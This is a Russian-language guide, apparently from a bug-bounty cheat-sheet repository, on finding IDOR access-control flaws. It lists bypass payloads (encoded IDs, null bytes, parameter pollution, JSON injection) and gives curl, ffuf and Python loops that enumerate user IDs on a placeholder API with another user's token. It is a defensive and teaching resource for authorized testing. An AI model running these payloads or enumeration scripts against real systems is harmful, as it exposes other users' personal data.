<a id="-idor---insecure-direct-object-reference"></a>
# 🔓 IDOR — небезопасные прямые ссылки на объекты

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление репозитория](../../README.ru.md) · [Английский оригинал](../README.md)


[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗██████╗  ██████╗ ██████╗ 
  ██║██╔══██╗██╔═══██╗██╔══██╗
  ██║██║  ██║██║   ██║██████╔╝
  ██║██║  ██║██║   ██║██╔══██╗
  ██║██████╔╝╚██████╔╝██║  ██║
  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
   Insecure Direct Object Reference
```

<p align="center">
  <img src="https://img.shields.io/badge/IDOR-Access_Control-red?style=for-the-badge" alt="IDOR">
  <img src="https://img.shields.io/badge/BOLA-Authorization-blue?style=for-the-badge" alt="BOLA">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Что такое IDOR](#-what-is-idor)
- [Где искать](#-where-to-look)
- [Типы идентификаторов и их изменение](#-id-types--manipulation)
- [Способы обхода](#-bypass-techniques)
- [Методика проверки](#-testing-methodology)
- [Инструменты и автоматизация](#-tools--automation)

---

<a id="-what-is-idor"></a>
## 🎯 Что такое IDOR

> **Уточнение.** Надпись ASCII-логотипа означает «небезопасные прямые ссылки на объекты». По [PortSwigger](https://portswigger.net/web-security/access-control/idor), IDOR — разновидность нарушения контроля доступа. Приведённые ниже способы изменения запроса зависят от реализации приложения и не являются универсальными обходами.


**IDOR** (Insecure Direct Object Reference) возникает, когда приложение предоставляет прямые ссылки на внутренние объекты — записи базы данных, файлы и другие ресурсы — без надлежащей проверки прав доступа.

<a id="impact"></a>
### Последствия
- 🔴 **Кража данных** — доступ к данным других пользователей
- 🔴 **Повышение привилегий** — доступ к административным функциям
- 🔴 **Захват учётной записи** — изменение чужих учётных записей
- 🔴 **Изменение данных** — удаление или изменение записей

<a id="idor-vs-bola"></a>
### IDOR и BOLA

> **Уточнение.** В таблице сохранена неполная строка оригинала: BOLA раскрывается как Broken Object Level Authorization — нарушение авторизации на уровне объектов. По [OWASP API1:2023](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/), доступ к чужому объекту отличается от доступа к запрещённой функции (BFLA); сами по себе UUID или хеши не заменяют проверку прав.

| IDOR | BOLA |
|------|------|
| Традиционный термин | Термин безопасности API |
| Нарушение авторизации на уровне объектов (Broken Object Level Authorization) |

---

<a id="-where-to-look"></a>
## 🔍 Где искать

<a id="url-parameters"></a>
### Параметры URL
```
/user/profile?id=123
/api/users/123
/download?file=report_123.pdf
/account/settings/123
/orders/view/123
```

<a id="postput-body"></a>
### Тело запроса POST/PUT
```json
{
  "user_id": 123,
  "account_id": 123,
  "order_id": 123
}
```

<a id="headers"></a>
### Заголовки
```http
X-User-ID: 123
X-Account-ID: 123
Cookie: user_id=123
```

<a id="common-parameters"></a>
### Распространённые параметры
```
id, user_id, uid, account_id, aid
profile_id, pid, order_id, oid
doc_id, document_id, file_id
invoice_id, transaction_id, ref
customer_id, cid, member_id
```

<a id="common-endpoints"></a>
### Распространённые конечные точки (endpoints)
```
/api/users/{id}
/api/orders/{id}
/api/invoices/{id}
/api/documents/{id}
/api/messages/{id}
/download/{id}
/files/{id}
/profile/{id}
/settings/{id}
```

---

<a id="-id-types--manipulation"></a>
## 🔢 Типы идентификаторов и их изменение

<a id="sequential-ids"></a>
### Последовательные идентификаторы
```
# Самый частый случай: увеличьте или уменьшите значение
/api/users/1
/api/users/2
/api/users/3

# Проверьте граничные значения
/api/users/0
/api/users/-1
/api/users/9999999
```

<a id="uuids"></a>
### UUID

> **Уточнение.** По [RFC 9562](https://datatracker.ietf.org/doc/html/rfc9562#section-8), нельзя считать UUID гарантированно неугадываемыми или использовать владение UUID как право доступа. Один лишь прирост последней части UUID в примере не доказывает закономерность генератора.

```
# Проверьте, действительно ли идентификаторы случайны
550e8400-e29b-41d4-a716-446655440000
550e8400-e29b-41d4-a716-446655440001  # Увеличьте последнюю часть

# Проверьте наличие закономерностей
# UUID на основе времени (v1): могут быть предсказуемы
# Случайные UUID (v4): труднее угадать
```

<a id="encoded-ids"></a>
### Кодированные идентификаторы

> **Уточнение.** Стрелки в примерах обозначают результат или пояснение, а не синтаксис команды. Обычный [echo добавляет перевод строки](https://www.gnu.org/s/coreutils/manual/html_node/echo-invocation.html), поэтому указанные MTIz и MTI0 соответствуют строкам без завершающего перевода строки; исходные примеры сохранены.

```
# Base64
echo "123" | base64  → MTIz
echo "124" | base64  → MTI0

# Проверьте кодированные значения
/api/users/MTIz  → декодирование = 123
/api/users/MTI0  → декодирование = 124

# Шестнадцатеричное кодирование
123 → 7b
124 → 7c
```

<a id="hashed-ids"></a>
### Хешированные идентификаторы
```
# MD5 идентификатора
/user/202cb962ac59075b964b07152d234b70  → md5(123)

# Проверьте разные алгоритмы
# Проверьте, основан ли хеш на идентификаторе или случайном значении
```

<a id="custom-formats"></a>
### Собственные форматы
```
# Идентификаторы с префиксом
/user/USR_123
/order/ORD_456
/doc/DOC_789

# На основе метки времени
/file/20240128_001
/file/20240128_002
```

---

<a id="-bypass-techniques"></a>
## 🛡️ Способы обхода

<a id="parameter-manipulation"></a>
### Изменение параметров
```bash
# Исходный запрос
GET /api/users/123

# Варианты
GET /api/users/124
GET /api/users/123,124
GET /api/users/123%00124
GET /api/users/[123,124]
GET /api/users?id=123&id=124
```

<a id="http-method-change"></a>
### Изменение метода HTTP
```bash
# Если GET заблокирован, проверьте другие методы
GET /api/users/124     → Заблокировано
POST /api/users/124    → Разрешено?
PUT /api/users/124     → Разрешено?
```

<a id="wrap-in-arraysobjects"></a>
### Оборачивание в массивы и объекты
```json
// Если id=124 заблокирован, проверьте:
{"id": [124]}
{"id": {"$eq": 124}}
{"ids": [123, 124]}
```

<a id="encoding-bypass"></a>
### Обход с помощью кодирования
```
# URL-кодирование
/api/users/12%34  → 124
/api/users/%31%32%34  → 124

# Двойное кодирование
/api/users/%2531%2532%2534  → 124

# Unicode
/api/users/１２４  → Полноширинное 124
```

<a id="case-manipulation"></a>
### Изменение регистра
```bash
/API/USERS/124
/Api/Users/124
/api/Users/124
```

<a id="path-traversal-combo"></a>
### Сочетание с обходом каталогов (path traversal)
```
/api/users/123/../124
/api/users/./124
/api/users/123/../../users/124
```

<a id="null-byte"></a>
### Нулевой байт
```
/api/users/124%00
/api/users/124%00.json
/api/users/124\x00
```

<a id="json-parameter-injection"></a>
### Инъекция параметров JSON
```json
// Исходный запрос
{"user_id": 123, "action": "view"}

// Атака
{"user_id": 124, "action": "view"}
{"user_id": "123\",\"target_id\": \"124", "action": "view"}
```

<a id="hpp-http-parameter-pollution"></a>
### HPP — загрязнение параметров HTTP
```
/api/user?id=123&id=124
/api/user?id=123&ID=124
/api/user?user_id=123&userid=124
```

---

<a id="-testing-methodology"></a>
## 📋 Методика проверки

<a id="step-1-identify"></a>
### Шаг 1: выявление
```
1. Составьте карту всех конечных точек со ссылками на объекты
2. Отметьте все параметры, похожие на идентификаторы
3. Создайте две тестовые учётные записи (User A и User B)
```

<a id="step-2-enumerate"></a>
### Шаг 2: сбор сведений
```
1. Под учётной записью User A запишите свои идентификаторы
2. Под учётной записью User B запишите свои идентификаторы
3. Найдите закономерности в идентификаторах
```

<a id="step-3-test"></a>
### Шаг 3: проверка
```
1. Под учётной записью User A проверьте доступ к объектам User B
2. Проверьте все операции CRUD:
   - Чтение (GET)
   - Создание (POST)
   - Обновление (PUT/PATCH)
   - Удаление (DELETE)
```

<a id="step-4-escalate"></a>
### Шаг 4: повышение привилегий
```
1. Проверьте идентификаторы администратора (часто 1, admin, 0)
2. Проверьте специальные значения (null, undefined, *)
3. Проверьте сочетание с другими уязвимостями
```

<a id="checklist"></a>
### Контрольный список
```markdown
- [ ] Параметры URL
- [ ] Параметры тела POST
- [ ] Заголовки (Cookie и пользовательские)
- [ ] Скрытые поля форм
- [ ] Конечные точки API
- [ ] Загрузка файлов с сервера
- [ ] Функции экспорта
- [ ] Функции удаления
- [ ] Административные функции
```

---

<a id="-tools--automation"></a>
## 🛠️ Инструменты и автоматизация

> **Уточнение.** Совпадение кода 200 или слова email в примерах ниже — лишь предварительный признак. Для подтверждения IDOR нужно установить, что текущая учётная запись не имеет права на полученный объект или действие: это следует из [модели объектной авторизации OWASP](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/). Сообщения скриптов сохранены дословно.


<a id="burp-suite-extensions"></a>
### Расширения Burp Suite
```
- Autorize (автоматизированное выявление IDOR)
- AuthMatrix
- Auto Repeater
```

<a id="autorize-setup"></a>
### Настройка Autorize
```
1. Установите расширение Autorize
2. Скопируйте cookie сеанса User B
3. Добавьте его в Autorize
4. Откройте приложение под учётной записью User A
5. Autorize повторит проверки с сеансом User B
```

<a id="manual-testing-with-curl"></a>
### Ручная проверка с помощью curl
```bash
# Токен User A
TOKEN_A="user_a_jwt_token"

# Проверьте доступ к ресурсу User B
curl -H "Authorization: Bearer $TOKEN_A" \
     https://api.target.com/users/124

# Переберите идентификаторы в цикле
for i in {1..100}; do
  curl -s -H "Authorization: Bearer $TOKEN_A" \
       "https://api.target.com/users/$i" | grep -q "email" && echo "IDOR: $i"
done
```

<a id="ffuf-for-idor"></a>
### Проверка IDOR с помощью ffuf
```bash
# Числовые идентификаторы
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w <(seq 1 1000) \
     -mc 200

# Со словарём
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w ids.txt \
     -mc 200 -fc 403,404
```

<a id="python-script"></a>
### Скрипт Python
```python
import requests

base_url = "https://api.target.com/users/"
headers = {"Authorization": "Bearer USER_A_TOKEN"}
my_id = 123

for i in range(1, 1000):
    if i == my_id:
        continue
    r = requests.get(f"{base_url}{i}", headers=headers)
    if r.status_code == 200:
        print(f"[IDOR] Accessible: {i}")
        print(r.json())
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="common-vulnerable-functions"></a>
### Часто уязвимые функции
| Функция | Риск |
|----------|------|
| Просмотр профиля | Утечка данных |
| Скачивание файла | Доступ к файлам |
| Удаление элемента | Потеря данных |
| Изменение настроек | Захват учётной записи |
| Просмотр заказов | Нарушение конфиденциальности |
| Экспорт данных | Массовая кража данных |

<a id="what-to-report"></a>
### Что указать в отчёте
```markdown
## IDOR в профиле пользователя

**Конечная точка:** GET /api/users/{id}

**Шаги:**
1. Войдите под учётной записью User A (ID: 123)
2. Отправьте запрос GET /api/users/124
3. Убедитесь, что возвращаются данные User B

**Последствия:** любой аутентифицированный пользователь может получить доступ
к персональным данным всех остальных пользователей.

**PoC:**
curl -H "Authorization: Bearer [token]" \
     https://api.target.com/users/124
```

---

<a id="-pro-tips"></a>
## 💡 Практические советы

> **Уточнение.** Утверждения оригинала о частой уязвимости экспорта и более слабой защите мобильных API — общие наблюдения, а не гарантия для конкретного приложения. В отчёте описывайте только подтверждённые последствия.


1. **Используйте две учётные записи** — всегда проверяйте с 2 учётными записями
2. **Проверяйте все методы** — GET, POST, PUT, DELETE
3. **Проверяйте все места передачи данных** — URL, тело, заголовки и cookie
4. **Проверяйте граничные случаи** — 0, -1, null, undefined
5. **Проверяйте сочетания атак** — IDOR + CSRF, IDOR + XSS
6. **Проверяйте экспорт** — выгрузки PDF и CSV часто бывают уязвимы
7. **Проверяйте мобильные API** — в оригинале отмечается, что они часто защищены слабее веб-приложений

---

<a id="-resources"></a>
## 📚 Ресурсы

- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [HackTricks IDOR](https://book.hacktricks.xyz/pentesting-web/idor)
- [Контроль доступа — PortSwigger](https://portswigger.net/web-security/access-control/idor)

---

<p align="center">
  <b>🔓 Находите уязвимости IDOR!</b><br>
  <i>Только для проверок с разрешения владельца!</i>
</p>
